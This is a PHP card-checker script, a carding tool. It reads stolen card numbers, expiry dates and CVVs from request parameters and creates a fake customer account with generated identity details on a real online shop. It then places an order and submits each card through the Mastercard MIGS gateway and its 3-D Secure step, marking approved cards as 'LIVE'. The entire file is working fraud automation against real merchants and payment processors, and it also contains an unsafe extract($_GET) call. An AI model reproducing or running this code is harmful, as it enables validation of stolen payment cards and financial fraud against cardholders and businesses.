<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);

    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://beautifulthings.nz/store/customers/register",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://beautifulthings.nz/store/customers/register",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
        ),
        CURLOPT_POSTFIELDS => "_method=POST&data%5BUser%5D%5Bfirst_name%5D=$fname&data%5BUser%5D%5Blast_name%5D=$lname&data%5BUser%5D%5Busername%5D=$fname$lname$cookie@gmail.com&data%5BUser%5D%5Bpassword%5D=happybird314&data%5BUser%5D%5Bpassword_confirm%5D=happybird314&data%5BUser%5D%5Bnewsletter%5D=0"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://beautifulthings.nz/store/orders/prepare_artwork",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
        ),
        CURLOPT_POSTFIELDS => "product_id=28251&qty=1&product_option_1=CARRIE+TOTE&product_option_2=CREAM&product_option_3=SINGLE+SIDED"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://beautifulthings.nz/store/orders/check_out",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_HTTPHEADER => array(
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
        ),
        CURLOPT_POSTFIELDS => "_method=POST&data%5BOrder%5D%5Bpickup_from_shop%5D=0&data%5BOrder%5D%5Bpickup_from_shop%5D=1&data%5BUserAddress%5D%5Bsignature%5D=0&data%5BOrder%5D%5Bspecial_instructions%5D=&data%5BUserAddress%5D%5Bshipping_company%5D=&data%5BUserAddress%5D%5Bshipping_address_1%5D=&data%5BUserAddress%5D%5Bshipping_address_2%5D=&data%5BUserAddress%5D%5Bshipping_suburb%5D=&data%5BUserAddress%5D%5Bshipping_city%5D=&data%5BUserAddress%5D%5Bshipping_post_code%5D=&data%5BUserAddress%5D%5Bshipping_region%5D=Auckland&data%5BUserAddress%5D%5Bshipping_country%5D=New+Zealand&data%5BUserAddress%5D%5Bshipping_phone%5D=&data%5BOrder%5D%5Brural%5D=0"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://beautifulthings.nz/store/orders/payment",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_ENCODING => "",
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => "POST",
        CURLOPT_HTTPHEADER => [
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
        ],
        CURLOPT_POSTFIELDS => "_method=POST&data%5BOrder%5D%5Bterms_conditions%5D=0&data%5BOrder%5D%5Bterms_conditions%5D=1&credit_card=Credit+Card"
    ));
    $paymentUrl = GetStr(curl_exec($ch), "Location: ", "\r\n");
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $paymentUrl,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $bakaSurajYan = curl_exec($ch);
    curl_close($ch);

    $vcpay = GetStr($bakaSurajYan, "Location: ", "\r\n");
    $payment_id = GetStr($vcpay, "paymentId=", "\r\n");
    $session_id = GetStr($vcpay, 'DOID=', '&');

    $cbin = substr($cc, 0,1);
    if($cbin == 5) $cbin = 'Mastercard'; else if($cbin == 4) $cbin = 'Visa'; else if($cbin == 3) $cbin = 'Amex';

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://migs.mastercard.com.au/vpcpay?card=$cbin&gateway=ssl&o=pt&paymentId=$payment_id",
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://migs.mastercard.com.au'.$vcpay,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $session = GetStr(curl_exec($ch), "Location: ", "\r\n");
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://migs.mastercard.com.au".$session,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer: https://migs.mastercard.com.au'.$vcpay,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://migs.mastercard.com.au/ssl',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://migs.mastercard.com.au',
            'referer: https://migs.mastercard.com.au/'.$session,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "paymentId=$payment_id&cardno=$cc&cardexpirymonth=$mm&cardexpiryyear=".substr($yy, 2, 4)."&cardsecurecode=$cvv&payButtonImage.x=69&payButtonImage.y=13"
    ));
    $ssl = curl_exec($ch);
    curl_close($ch);

    $formshits = GetStr($ssl, '<form', '</form>');
    $pahandlerUrl = GetStr($formshits, 'name="PAReq" action="', '"');
    $paramReq = GetStr($formshits, 'name="PaReq" value="', '"');
    $termUrl = GetStr($formshits, 'name="TermUrl" value="', '"');
    $md = GetStr($formshits, 'name="MD" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $pahandlerUrl,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://migs.mastercard.com.au',
            'referer: https://migs.mastercard.com.au/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaReq=".urlencode($paramReq)."&TermUrl=".urlencode($termUrl)."&MD=$md"
    ));
    $pahandler = curl_exec($ch);
    curl_close($ch);

    $handlerformshits = GetStr($pahandler, '<form', '</form>');
    $paramRes = GetStr($handlerformshits, 'name="PaRes" value="', '"');
    $pahandlerMD = GetStr($handlerformshits, 'name="MD" value="', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://migs.mastercard.com.au/ssl?paymentId=".$payment_id,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://aacsw.3ds.verifiedbyvisa.com',
            'referer: https://aacsw.3ds.verifiedbyvisa.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaRes=".urlencode($paramRes)."&MD=$pahandlerMD"
    ));
    $timeStamp = GetStr(curl_exec($ch), '&currentTimeStamp=', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => "https://migs.mastercard.com.au/ssl?paymentId=$payment_id&currentTimeStamp=".$timeStamp,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'referer: https://migs.mastercard.com.au/ssl?paymentId='.$payment_id,
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $execute = curl_exec($ch);
    curl_close($ch);

    $response = urldecode(GetStr($execute, ';URL=', '"'));
    $message = GetStr($response, 'vpc_Message=', '&');
    $cvvResponse = GetStr($response, 'vpc_CSCResultCode=', '&');

    $hinlo = "CSCResultCode = $cvvResponse | Message = $message";

    if (strpos($response, 'vpc_Message=Approved')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">'.$hinlo.'</span></td></tr><br>';

    } elseif ($cvvResponse == "M") {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$hinlo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$hinlo.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }
    unlink("cookies/$cookie.txt");
?>